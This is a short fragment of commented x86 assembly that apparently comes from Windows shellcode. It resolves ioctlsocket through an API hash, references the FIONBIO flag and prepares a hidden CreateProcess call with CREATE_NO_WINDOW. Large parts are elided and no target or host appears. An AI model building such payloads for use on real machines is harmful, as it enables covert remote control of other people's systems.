...
;ioctlsocket(  _In_     SOCKET s,  _In_     long cmd,  _Inout_  u_long *argp)
; ioctlsocket 0x892E2ED
;FIONBIO 46 49 4f 4e 42 49 4f
xor eax,eax				; zero out eax
...
;createprocess
	...
	push 0x08000000		; set the dwcreationflag to CREATE_NO_WINDO
